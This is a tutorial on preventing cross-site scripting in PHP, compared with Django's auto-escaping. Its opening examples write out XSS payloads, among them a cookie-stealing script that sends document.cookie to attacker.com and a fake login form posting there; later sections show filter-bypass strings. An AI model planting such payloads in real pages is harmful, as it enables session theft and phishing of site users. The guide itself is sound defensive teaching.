# PHP Security: Escaping & XSS Protection

Complete guide to preventing XSS attacks in PHP for Django developers.

---

## 📋 Table of Contents

1. [What is XSS?](#1-what-is-xss)
2. [Django Auto-Protection](#2-django-auto-protection)
3. [PHP Manual Escaping](#3-php-manual-escaping)
4. [The Golden Rule](#4-the-golden-rule)
5. [Different Escape Contexts](#5-different-escape-contexts)
6. [Django vs PHP Comparison](#6-django-vs-php-comparison)
7. [What NOT to Do](#7-what-not-to-do)
8. [Best Practices](#8-best-practices)
9. [Real Examples](#9-real-examples)
10. [Security Checklist](#10-security-checklist)

---

## 1️⃣ What is XSS?

### XSS = Cross-Site Scripting

**Scenario:**
User submits form input:
```html
<script>alert("Hacked")</script>
```

You display it without escaping:
```php
<h2>Welcome <?= $username ?></h2>
```

**Result:**
```html
<h2>Welcome <script>alert("Hacked")</script></h2>
```

👉 **Browser executes the script!** 😱

### Real Attack Examples

**Steal Cookies:**
```javascript
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

**Redirect User:**
```javascript
<script>window.location='http://malicious-site.com';</script>
```

**Fake Login Form:**
```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;">
    <form action="http://attacker.com/steal.php">
        Login: <input name="password" type="password">
    </form>
</div>
```

---

## 2️⃣ Django Auto-Protection

### Django Template (Safe by Default)

```python
# views.py
def profile(request):
    username = request.POST.get('username')
    # Even if username = "<script>alert('XSS')</script>"
    return render(request, 'profile.html', {'username': username})
```

```html
<!-- profile.html -->
<h2>Welcome {{ username }}</h2>
```

**Output (Safe):**
```html
<h2>Welcome &lt;script&gt;alert('XSS')&lt;/script&gt;</h2>
```

✅ **Django auto-escapes**  
✅ **Script shows as text**  
✅ **Safe by default**

### Django Disable Escaping (Dangerous!)

```html
<!-- DON'T DO THIS unless you know what you're doing! -->
<div>{{ html_content|safe }}</div>
```

---

## 3️⃣ PHP Manual Escaping

### ❌ Unsafe (Never Do This)

```php
<?php
$username = $_POST['username'];
?>
<h2>Welcome <?= $username ?></h2>
```

**If** `$username = "<script>alert('XSS')</script>"`  
**Then** browser executes script! ❌

### ✅ Safe Way (HTML Output)

```php
<h2>Welcome <?= htmlspecialchars($username, ENT_QUOTES, 'UTF-8') ?></h2>
```

**Output:**
```html
<h2>Welcome &lt;script&gt;alert('XSS')&lt;/script&gt;</h2>
```

✅ Script shows as text  
✅ Safe!

### htmlspecialchars() Explained

```php
htmlspecialchars($string, $flags, $encoding)
```

**Parameters:**

| Parameter | Value | Purpose |
|-----------|-------|---------|
| `$string` | Your data | String to escape |
| `$flags` | `ENT_QUOTES` | Escape both `"` and `'` |
| `$encoding` | `'UTF-8'` | Character encoding |

**What it converts:**

| Character | Converts to |
|-----------|-------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` (with ENT_QUOTES) |
| `'` | `&#039;` (with ENT_QUOTES) |

---

## 4️⃣ The Golden Rule

### 🧠 Tattoo This in Your Brain

> **Escape when OUTPUTTING, NOT when INPUTTING**

### ❌ Wrong Approach (Input Escaping)

```php
// DON'T do this
$username = htmlspecialchars($_POST['username']);
// Save to database escaped

// Later when you output
echo $username; // Already escaped, wrong!
```

**Problem:** Data stored escaped, can't search properly

### ✅ Correct Approach (Output Escaping)

```php
// Store raw
$username = $_POST['username'];
// Save to database AS IS

// Escape only when displaying
echo htmlspecialchars($username);
```

**Why?**
- ✅ Store original data
- ✅ Searchable in database
- ✅ Flexible output (HTML, JSON, PDF, etc.)

### Django Follows Same Rule

```python
# Django stores raw
user.name = request.POST.get('name')
user.save()

# Escapes on output
{{ user.name }}  # Auto-escaped
```

---

## 5️⃣ Different Escape Contexts

### 🟦 Context 1: HTML Body

```php
<h1><?= htmlspecialchars($title) ?></h1>
<p><?= htmlspecialchars($description) ?></p>
```

**Django:**
```html
<h1>{{ title }}</h1>
<p>{{ description }}</p>
```

### 🟨 Context 2: HTML Attribute

```php
<input type="text" 
       value="<?= htmlspecialchars($username, ENT_QUOTES, 'UTF-8') ?>">

<a href="<?= htmlspecialchars($url) ?>" 
   title="<?= htmlspecialchars($title, ENT_QUOTES, 'UTF-8') ?>">
```

**⚠️ MUST use ENT_QUOTES** to escape both `"` and `'`

**Django:**
```html
<input type="text" value="{{ username }}">
<a href="{{ url }}" title="{{ title }}">
```

### 🟩 Context 3: JavaScript

```php
<script>
    let username = <?= json_encode($username) ?>;
    let userData = <?= json_encode($user_data) ?>;
</script>
```

**Why json_encode?**
- ✅ Properly escapes quotes
- ✅ Handles special characters
- ✅ Works with arrays/objects

**Django:**
```html
<script>
    let username = {{ username|escapejs|safe }};
    let userData = {{ user_data|json_script:"user-data" }};
</script>
```

**Better Django way:**
```html
{{ user_data|json_script:"user-data" }}
<script>
    let userData = JSON.parse(document.getElementById('user-data').textContent);
</script>
```

### 🟥 Context 4: URL Parameters

```php
<a href="profile.php?username=<?= urlencode($username) ?>">Profile</a>
<a href="search.php?q=<?= urlencode($search_query) ?>">Search</a>
```

**Why urlencode?**
- ✅ Handles spaces (space → `%20`)
- ✅ Escapes special URL characters
- ✅ Prevents URL injection

**Django:**
```html
<a href="{% url 'profile' username=username %}">Profile</a>
<a href="/search/?q={{ search_query|urlencode }}">Search</a>
```

### 🟪 Context 5: CSS (Rare)

```php
<style>
    .user-color {
        /* DON'T put user input in CSS! */
        /* If you must: */
        color: <?= preg_replace('/[^a-zA-Z0-9#]/', '', $color) ?>;
    }
</style>
```

**Best practice:** Don't allow user input in CSS at all!

---

## 6️⃣ Django vs PHP Comparison

### Full Comparison Table

| Context | Django | PHP | Notes |
|---------|--------|-----|-------|
| **HTML Body** | `{{ var }}` (auto) | `htmlspecialchars($var)` | Django wins |
| **HTML Attribute** | `{{ var }}` (auto) | `htmlspecialchars($var, ENT_QUOTES, 'UTF-8')` | Django wins |
| **JavaScript** | `{{ var\|escapejs }}` | `json_encode($var)` | Similar |
| **URL** | `{{ var\|urlencode }}` | `urlencode($var)` | Same |
| **JSON** | `{{ var\|json_script }}` | `json_encode($var)` | Django better |
| **Default behavior** | **Safe** | **Unsafe** | Django wins |

### Code Comparison

**Django Template:**
```html
<h1>{{ title }}</h1>
<input value="{{ username }}">
<a href="?q={{ query }}">Search</a>
<script>
    let data = {{ data|json_script:"data" }};
</script>
```

**PHP Equivalent:**
```php
<h1><?= htmlspecialchars($title) ?></h1>
<input value="<?= htmlspecialchars($username, ENT_QUOTES, 'UTF-8') ?>">
<a href="?q=<?= urlencode($query) ?>">Search</a>
<script>
    let data = <?= json_encode($data) ?>;
</script>
```

**📌 Django = Less typing, safer default**

---

## 7️⃣ What NOT to Do

### ❌ Wrong Methods

#### 1. strip_tags() (Not Enough)

```php
// WRONG! Not security solution
$clean = strip_tags($input);
echo $clean; // Still vulnerable
```

**Why wrong?**
```php
$input = '<script>alert("XSS")</script>';
echo strip_tags($input); // Empty, but...

$input = '<img src=x onerror=alert("XSS")>';
echo strip_tags($input); // Removes tag but attribute remains!
```

#### 2. addslashes() (Wrong Purpose)

```php
// WRONG! This is for SQL, not HTML
$clean = addslashes($input);
echo $clean; // Still vulnerable to XSS
```

**addslashes()** is for SQL injection, not XSS!

#### 3. Custom Regex (Incomplete)

```php
// WRONG! Incomplete, bypassable
$clean = str_replace(['<', '>'], '', $input);
echo $clean; // Can be bypassed
```

**Bypass example:**
```php
$input = '<script>alert("XSS")</script>';
// Attacker uses: <SCRscriptIPT>alert("XSS")</SCRscriptIPT>
```

#### 4. Filter Blacklist (Bad Approach)

```php
// WRONG! Endless game of whack-a-mole
$bad_words = ['<script>', 'javascript:', 'onerror'];
foreach ($bad_words as $word) {
    $input = str_replace($word, '', $input);
}
// Attacker finds new bypass
```

### ✅ Right Method

**Only one reliable way:**

```php
htmlspecialchars($input, ENT_QUOTES, 'UTF-8')
```

---

## 8️⃣ Best Practices

### Practice 1: Create Helper Function

```php
<?php
/**
 * Escape HTML output
 * Short name for convenience
 */
function e($value) {
    return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}

/**
 * Escape for HTML attribute
 */
function attr($value) {
    return htmlspecialchars($value, ENT_QUOTES, 'UTF-8');
}

/**
 * Escape for JavaScript
 */
function js($value) {
    return json_encode($value, JSON_HEX_TAG | JSON_HEX_AMP);
}

/**
 * Escape for URL
 */
function url($value) {
    return urlencode($value);
}
?>
```

**Usage:**
```php
<h1><?= e($title) ?></h1>
<input value="<?= attr($username) ?>">
<a href="?q=<?= url($query) ?>">Search</a>
<script>let data = <?= js($data) ?>;</script>
```

**📌 Laravel does this automatically!**

### Practice 2: Always Escape in Templates

```php
<!-- ALWAYS escape -->
<h1><?= e($title) ?></h1>
<p><?= e($content) ?></p>

<!-- Even in loops -->
<?php foreach ($users as $user): ?>
    <li><?= e($user['name']) ?></li>
<?php endforeach; ?>
```

### Practice 3: Validate Input

```php
// Validate AND escape
$email = filter_var($_POST['email'], FILTER_VALIDATE_EMAIL);
if (!$email) {
    $error = "Invalid email";
}

// Still escape on output
echo e($email);
```

**📌 Validation ≠ Escaping**
- **Validation** = Check format
- **Escaping** = Prevent XSS

### Practice 4: Use Prepared Statements (Database)

```php
// WRONG (SQL Injection)
$query = "SELECT * FROM users WHERE username = '$username'";

// RIGHT (Prepared Statement)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

**Different from XSS:**
- **XSS** = Browser attack
- **SQL Injection** = Database attack

Both need different protection!

---

## 9️⃣ Real Examples

### Example 1: User Profile Display

```php
<?php
// Get user data (from database)
$user = [
    'name' => 'Ali Ahmed',
    'bio' => 'Love coding & <3 PHP',
    'website' => 'https://example.com',
    'twitter' => '@ali_dev'
];
?>

<!DOCTYPE html>
<html>
<head>
    <title><?= e($user['name']) ?> - Profile</title>
</head>
<body>
    <!-- HTML Body -->
    <h1><?= e($user['name']) ?></h1>
    <p><?= e($user['bio']) ?></p>
    
    <!-- HTML Attribute -->
    <a href="<?= e($user['website']) ?>" 
       title="Visit <?= attr($user['name']) ?>'s website">
        Website
    </a>
    
    <!-- URL Parameter -->
    <a href="search.php?q=<?= url($user['twitter']) ?>">
        Find on Twitter
    </a>
    
    <!-- JavaScript -->
    <script>
        let userData = <?= js($user) ?>;
        console.log(userData.name);
    </script>
</body>
</html>
```

### Example 2: Comment Section

```php
<?php
function e($v) { return htmlspecialchars($v, ENT_QUOTES, 'UTF-8'); }

$comments = [
    ['user' => 'Ali', 'text' => 'Great post!'],
    ['user' => 'Hacker', 'text' => '<script>alert("XSS")</script>'],
    ['user' => 'Rahim', 'text' => 'Thanks for sharing']
];
?>

<div class="comments">
    <h2>Comments</h2>
    <?php foreach ($comments as $comment): ?>
        <div class="comment">
            <strong><?= e($comment['user']) ?>:</strong>
            <p><?= e($comment['text']) ?></p>
        </div>
    <?php endforeach; ?>
</div>
```

**Output (Safe):**
```html
<div class="comment">
    <strong>Hacker:</strong>
    <p>&lt;script&gt;alert("XSS")&lt;/script&gt;</p>
</div>
```

### Example 3: Search Results

```php
<?php
function e($v) { return htmlspecialchars($v, ENT_QUOTES, 'UTF-8'); }
function url($v) { return urlencode($v); }

$search_query = $_GET['q'] ?? '';
$results = [
    'PHP Tutorial',
    'Django vs PHP',
    'Security Best Practices'
];
?>

<h1>Search Results for: <?= e($search_query) ?></h1>

<?php if (empty($results)): ?>
    <p>No results found for "<?= e($search_query) ?>"</p>
<?php else: ?>
    <ul>
    <?php foreach ($results as $result): ?>
        <li>
            <a href="view.php?title=<?= url($result) ?>">
                <?= e($result) ?>
            </a>
        </li>
    <?php endforeach; ?>
    </ul>
<?php endif; ?>
```

---

## 🔟 Security Checklist

### ✅ Before Deploying PHP App

- [ ] All `<?= $var ?>` replaced with `<?= e($var) ?>`
- [ ] All attributes use `ENT_QUOTES`
- [ ] JavaScript data uses `json_encode()`
- [ ] URL parameters use `urlencode()`
- [ ] Database queries use prepared statements
- [ ] Input validation in place
- [ ] CSRF protection implemented
- [ ] HTTPS enabled in production
- [ ] Error messages don't reveal sensitive info
- [ ] File uploads validated (type, size, extension)

### 🚨 Red Flags (Fix Immediately)

```php
// ❌ Direct output
<?= $_POST['username'] ?>

// ❌ No ENT_QUOTES in attribute
value="<?= htmlspecialchars($var) ?>"

// ❌ Using strip_tags for security
strip_tags($_POST['input'])

// ❌ SQL without prepared statement
"SELECT * FROM users WHERE id = " . $_GET['id']

// ❌ Eval user input (NEVER!)
eval($_POST['code'])
```

---

## 📊 Quick Reference Card

### Save This!

```php
// HTML Output
<?= htmlspecialchars($var, ENT_QUOTES, 'UTF-8') ?>

// Or use helper
function e($v) { 
    return htmlspecialchars($v, ENT_QUOTES, 'UTF-8'); 
}
<?= e($var) ?>

// JavaScript
<script>let x = <?= json_encode($var) ?>;</script>

// URL
<a href="?q=<?= urlencode($var) ?>">

// NEVER use
strip_tags()  // Wrong
addslashes()  // Wrong for XSS
```

---

## 💡 Summary

| Concept | PHP | Django | Winner |
|---------|-----|--------|--------|
| **Default** | Unsafe | Safe | Django ✅ |
| **HTML Escape** | Manual | Auto | Django ✅ |
| **Typing** | More | Less | Django ✅ |
| **Flexibility** | High | Medium | PHP |
| **Learning** | Harder (security) | Easier | Django ✅ |

### Key Takeaways:

1. **Always escape output** (not input)
2. **Use htmlspecialchars()** with ENT_QUOTES and UTF-8
3. **Different contexts need different escaping**
4. **Create helper functions** for convenience
5. **Django does this automatically** (reason to love Django!)

---

## 🚀 Next Steps

You now understand PHP security! Next topics:

1. **CSRF Protection** - Prevent form hijacking
2. **SQL Injection** - Secure database queries
3. **File Upload Security** - Safe file handling
4. **Session Security** - Protect user sessions

---

তুমি PHP security বুঝে গেছো! 🔐💪

This is the MOST important lesson in PHP.  
Django করে automatically, PHP-তে manually করতে হয়।

**Updated:** February 2026  
**Type:** PHP Security & XSS Prevention Guide